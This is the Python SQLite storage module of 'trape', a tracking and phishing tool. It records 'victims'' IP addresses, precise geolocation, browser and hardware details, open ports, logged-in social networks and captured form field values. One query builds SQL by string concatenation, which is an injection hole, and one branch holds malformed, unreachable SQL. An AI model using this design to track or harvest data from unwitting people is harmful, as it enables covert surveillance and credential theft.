#!/usr/bin/env python
# -*- coding: utf-8 -*-
# **
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/jofpin/trape
#
# Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
# **
import sqlite3
import os.path as path


class Database(object):
    def __init__(self):
        self.firstTime = not(path.exists("database.db"))
        self.conn = sqlite3.connect("database.db", check_same_thread=False)
        self.cursor = self.conn.cursor()

    def loadDatabase(self):
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS "geo" ( `id` TEXT, `city` TEXT, `country_code` TEXT, `country_name` TEXT, `ip` TEXT, `latitude` TEXT, `longitude` TEXT, `metro_code` TEXT, `region_code` TEXT, `region_name` TEXT, `time_zone` TEXT, `zip_code` TEXT, `isp` TEXT, `ua` TEXT, `connection` TEXT, `latitude_browser` TEXT, `longitude_browser` TEXT, `refer` TEXT, PRIMARY KEY(`id`) )""")
        self.cursor.execute(
            """CREATE TABLE IF NOT EXISTS "networks" ( `id` TEXT, `ip` TEXT, `public_ip` INTEGER, `network` TEXT, `date` TEXT )""")
        self.cursor.execute(
            """CREATE TABLE IF NOT EXISTS "requests" ( `id` TEXT, `user_id` TEXT, `site` TEXT, `fid` TEXT, `name` TEXT, `value` TEXT, `date` TEXT )""")
        self.cursor.execute(
            """CREATE TABLE IF NOT EXISTS "victims" ( `id` TEXT, `ip` TEXT, `date` TEXT, `time` REAL, `bVersion` TEXT, `browser` TEXT, `device` TEXT, `cpu` TEXT, `ports` TEXT, `status`  TEXT )""")
        self.cursor.execute(
            """CREATE TABLE IF NOT EXISTS "victims_data" ( `id` TEXT, `name` TEXT, `last_online` date, `gpu` TEXT, `donottrack` TEXT, `navigation_mode` TEXT)""")
        self.cursor.execute(
            """CREATE TABLE IF NOT EXISTS "victims_battery" ( `id` TEXT, `charging` TEXT, `time_c` REAL, `time_d` REAL, `level` REAL)""")
        self.cursor.execute(
            """CREATE TABLE IF NOT EXISTS "clicks" ( `id` TEXT, `site` TEXT, `date` TEXT )""")
        self.cursor.execute(
            """CREATE TABLE IF NOT EXISTS "hostsalive" ( `id` TEXT, `remote_ip` TEXT, `ping` TEXT, `date` TEXT )""")
        self.conn.commit()
        return True

    def sql_execute(self, sentence):
        if type(sentence) is str:
            self.cursor.execute(sentence)
        else:
            self.cursor.execute(sentence[0], sentence[1])
        return self.cursor.fetchall()

    def sql_one_row(self, sentence, column):
        if type(sentence) is str:
            self.cursor.execute(sentence)
        else:
            self.cursor.execute(sentence[0], sentence[1])
        return self.cursor.fetchone()[column]

    def sql_insert(self, sentence):
        if type(sentence) is str:
            self.cursor.execute(sentence)
        else:
            self.cursor.execute(sentence[0], sentence[1])
        self.conn.commit()
        return True

    def prop_sentences_stats(self, type, vId=None):
        return {
            'get_data': "SELECT victims.*, geo.id, geo.city, geo.country_code, geo.country_name, geo.ip, geo.latitude, geo.longitude, geo.metro_code, geo.region_code, geo.region_name, geo.time_zone, geo.zip_code, geo.isp, geo.ua, victims.ip AS ip_local, COUNT(clicks.id), geo.connection, clicks.site, geo.refer, victims_data.last_online, victims_data.name, victims_battery.charging, victims_battery.time_c, victims_battery.time_d, victims_battery.level FROM victims INNER JOIN geo ON victims.id = geo.id LEFT JOIN clicks ON clicks.id = victims.id LEFT JOIN victims_battery ON victims_battery.id = victims.id LEFT JOIN victims_data ON victims_data.id = victims.id GROUP BY victims.id ORDER BY victims.time DESC",
            'all_networks': "SELECT networks.* FROM networks ORDER BY id",
            'get_preview': ("SELECT victims.*, geo.id, geo.city, geo.country_code, geo.country_name, geo.ip, geo.latitude, geo.longitude, geo.metro_code, geo.region_code, geo.region_name, geo.time_zone, geo.zip_code, geo.isp, geo.ua, victims.ip AS ip_local, geo.connection, geo.latitude_browser, geo.longitude_browser, victims_battery.charging, victims_battery.time_c, victims_battery.level, victims_battery.time_d, victims_data.navigation_mode, victims_data.donottrack, victims_data.last_online, victims_data.name, victims_data.gpu FROM victims INNER JOIN geo ON victims.id = geo.id LEFT JOIN victims_battery ON victims_battery.id = victims.id LEFT JOIN victims_data ON victims_data.id = victims.id  WHERE victims.id = ?", vId),
            'id_networks': ("SELECT networks.* FROM networks WHERE id = ?", vId),
            'get_requests': "SELECT requests.*, geo.ip FROM requests INNER JOIN geo on geo.id = requests.user_id ORDER BY requests.date DESC, requests.id ",
            'get_sessions': "SELECT COUNT(*) AS Total FROM networks",
            'get_clicks': "SELECT COUNT(*) AS Total FROM clicks",
            'get_online': ("SELECT COUNT(*) AS Total FROM victims WHERE status = ?", vId),
            'get_hostsalive': ("SELECT hostsalive.* FROM hostsalive WHERE id = ?", vId),
            'get_socialimpact': ("SELECT networks.network, COUNT(DISTINCT networks.id) AS Sessions, COUNT(DISTINCT geo.id) AS Locations, COUNT(DISTINCT clicks.id) AS Interactions FROM networks LEFT JOIN geo ON networks.id = geo.id AND geo.latitude_browser <> '' LEFT JOIN clicks ON networks.id = clicks.id GROUP BY networks.network ORDER BY Sessions DESC, Interactions DESC, Locations DESC, network")
        }.get(type, False)

    def sentences_stats(self, type, vId=None):
        return self.sql_execute(self.prop_sentences_stats(type, vId))

    def prop_sentences_victim(self, type, data=None):
        if type == 'count_victim':
            t = (data,)
            return ("SELECT COUNT(*) AS C FROM victims WHERE id = ?", t)
        elif type == 'count_times':
            t = (data,)
            return ("SELECT COUNT(*) AS C FROM clicks WHERE id = ?", t)
        elif type == 'update_victim':
            t = (data[0].ip, data[0].date, data[0].version, data[0].browser,
                 data[0].device, data[0].ports, data[2], data[0].cpu, 'online', data[1],)
            return ("UPDATE victims SET ip = ?, date = ?, bVersion = ?, browser = ?, device = ?, ports = ?, time = ?, cpu = ?, status = ? WHERE id = ?", t)
        elif type == 'update_victim_geo':
            t = (data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code,
                 data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua, data[1],)
            return ("UPDATE geo SET city = ?, country_code = ?, country_name = ?, ip = ?, latitude = ?, longitude = ?, metro_code = ?, region_code = ?, region_name = ?, time_zone = ?, zip_code = ?, isp = ?, ua=? WHERE id = ?", t)
        elif type == 'insert_victim':
            t = (data[1], data[0].ip, data[0].date, data[0].version, data[0].browser,
                 data[0].device, data[0].ports, data[2], data[0].cpu, 'online',)
            return ("INSERT INTO victims(id, ip, date, bVersion, browser, device, ports, time, cpu, status) VALUES(?,?, ?,?, ?,?, ?, ?, ?, ?)", t)
        elif type == 'insert_victim_data':
            t = (data[0], '', 'online', '{}', '', '',)
            return ("INSERT INTO victims_data(id, name, last_online, gpu, donottrack, navigation_mode) VALUES(?, ?, ?, ?, ?, ? )", t)
        elif type == 'insert_victim_battery':
            t = (data[0], '', 0, 0, 100,)
            return ("INSERT INTO victims_battery(id, charging, time_c, time_d, level) VALUES(?, ?, ?, ?, ?)", t)
        elif type == 'insert_victim_geo':
            t = (data[1], data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code,
                 data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua, data[0].refer,)
            return ("INSERT INTO geo(id, city, country_code, country_name, ip, latitude, longitude, metro_code, region_code, region_name, time_zone, zip_code, isp, ua, refer) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", t)
        elif type == 'count_victim_network':
            return ("SELECT COUNT(*) AS C FROM networks WHERE id = ? AND network = ?", (data[0], data[1],))
        elif type == 'delete_networks':
            return ("DELETE FROM networks WHERE id = ?", (data[0],))
        elif type == 'update_network':
            return ("UPDATE networks SET date = ? WHERE id = ? AND network = ?", (data[2], data[0], data[1],))
        elif type == 'insert_networks':
            t = (data[0], data[1], data[2], data[3], data[4],)
            return ("INSERT INTO networks(id, public_ip, ip, network, date) VALUES(?,?, ?, ?,?)", t)
        elif type == 'insert_requests':
            t = (data[0].sId, data[0].id, data[0].site,
                 data[0].fid, data[0].name, data[0].value, data[1],)
            return ("INSERT INTO requests(id, user_id, site, fid, name, value, date) VALUES(?, ?,?, ?, ?,?, ?)", t)
        elif type == 'insert_click':
            return ("INSERT INTO clicks(id, site, date) VALUES(?, ?,?)", (data[0], data[1], data[2],))
        elif type == 'report_online':
            return ("UPDATE victims SET status = ? WHERE id = ?", ('online', data[0],))
        elif type == 'clean_online':
            return ("UPDATE victims SET status = ? ", ('offline',))
        elif type == 'clean_online':
            return ("UPDATE victims SET status = ? WHERE ", ('offline',))
        elif type == 'clean_usersnoping':
            return ("UPDATE victims SET status = ? WHERE victims.id IN (SELECT id FROM victims_data WHERE julianday(CURRENT_TIMESTAMP) - julianday(replace(victims_data.last_online, ' - ', 'T')) >= ?)", ('offline', 0.2087,))
        elif type == 'disconnect_victim':
            return ("UPDATE victims SET status = ? WHERE id = ?", ('offline', data,))
        elif type == 'location_victim':
            return ("UPDATE geo SET latitude_browser = ?, longitude_browser = ? WHERE id = ?", (data[1], data[2], data[0]))
        elif type == 'connection_victim':
            return ("UPDATE geo SET connection = ?, refer = ? WHERE id = ?", (data[1], data[2], data[0]))
        elif type == 'update_battery':
            return ("UPDATE victims_battery SET " + data[2] + " = ? WHERE id = ?", (data[1], data[0]))
        elif type == 'update_navigationmode':
            return ("UPDATE victims_data SET navigation_mode = ?, donottrack = ? WHERE id = ?", (data[1], data[2], data[0]))
        elif type == 'update_lastping':
            return ("UPDATE victims_data SET last_online = ? WHERE id = ?", (data[1], data[0],))
        elif type == 'update_name':
            return ("UPDATE victims_data SET name = ? WHERE id = ?", (data[1], data[0],))
        elif type == 'delete_hostalive':
            return ("DELETE FROM hostsalive WHERE id = ?", (data,))
        elif type == 'register_hostalive':
            return ("INSERT INTO hostsalive (id, remote_ip, ping, date) VALUES(?,?,?,?)", (data[0], data[1], data[2], data[3]))
        elif type == 'delete_victim':
            return ("DELETE FROM victims WHERE id = ?", (data,))
        elif type == 'delete_geo':
            return ("DELETE FROM geo WHERE id = ?", (data,))
        elif type == 'update_localIp':
            return ("UPDATE victims SET ip = ? WHERE id = ?", (data[1], data[0],))
        elif type == 'update_gpu':
            return ("UPDATE victims_data SET gpu = ? WHERE id = ?", (data[1], data[0],))
        else:
            return False

    def sentences_victim(self, type, data=None, sRun=1, column=0):
        if sRun == 2:
            return self.sql_insert(self.prop_sentences_victim(type, data))
        elif sRun == 3:
            return self.sql_one_row(self.prop_sentences_victim(type, data), column)
        else:
            return self.sql_execute(self.prop_sentences_victim(type, data))

    def __del__(self):
        self.conn.close()
